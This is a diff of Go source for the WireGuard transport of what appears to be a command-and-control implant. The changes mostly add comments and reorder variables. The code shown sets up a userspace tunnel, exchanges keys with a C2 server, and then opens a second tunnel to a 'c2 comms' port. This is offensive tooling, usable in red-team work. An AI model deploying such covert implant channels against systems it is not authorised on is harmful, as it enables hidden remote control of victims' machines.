@@ -45,8 +45,8 @@ import (
 
 var (
 	serverTunIP           = "100.64.0.1" // Don't let user configure this for now
-	serverTunPort         = 8888
-	serverKeyExchangePort = 1337
+	serverKeyExchangePort = 1337         // Server TCP port for wg key exchange. Virtual netstack port.
+	serverTunPort         = 8888         // Server TCP port for c2 comms. Virtual netstack port.
 )
 
 // socketWGWriteEnvelope - Writes a message to the wireguard socket using length prefix framing
@@ -128,7 +128,7 @@ func socketWGReadEnvelope(connection net.Conn) (*pb.Envelope, error) {
 	return envelope, nil
 }
 
-// wgConnect - Get a wg connection or die trying
+// wgSocketConnect - Get a wg connection or die trying
 func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 
 	_, dev, tnet, err := bringUpWGInterface(address, port, wgImplantPrivKey, wgServerPubKey, wgPeerTunIP)
@@ -152,6 +152,8 @@ func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, err
 	// {{if .Config.Debug}}
 	log.Printf("Signaling wg device to go down")
 	// {{end}}
+
+	// Close initial wireguard connection
 	err = dev.Down()
 
 	if err != nil {
@@ -161,6 +163,7 @@ func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, err
 		return nil, nil, err
 	}
 
+	// Bring up second wireguard connection using retrieved keys and IP
 	_, dev, tnet, err = bringUpWGInterface(address, port, privKey, pubKey, newIP)
 
 	connection, err := tnet.Dial("tcp", fmt.Sprintf("%s:%d", serverTunIP, serverTunPort))
@@ -177,10 +180,12 @@ func wgSocketConnect(address string, port uint16) (net.Conn, *device.Device, err
 	return connection, dev, nil
 }
 
+// bringUpWGInterface - First ceates an inet.af network stack.
+// then creates a Wireguard device/interface and applies configuration
 func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string) (tun.Device, *device.Device, *netstack.Net, error) {
 	tun, tnet, err := netstack.CreateNetTUN(
 		[]net.IP{net.ParseIP(netstackTunIP)},
-		[]net.IP{net.ParseIP("127.0.0.1")},
+		[]net.IP{net.ParseIP("127.0.0.1")}, // We don't use DNS in the WG implant. Yet.
 		1420)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -217,6 +222,7 @@ func bringUpWGInterface(address string, port uint16, implantPrivKey string, serv
 	return tun, dev, tnet, nil
 }
 
+// doKeyExchange - Connect to key exchange listener and retrieve new dynamic wg keys
 func doKeyExchange(conn net.Conn) (string, string, string) {
 	// {{if .Config.Debug}}
 	log.Printf("Connected to key exchange listener")
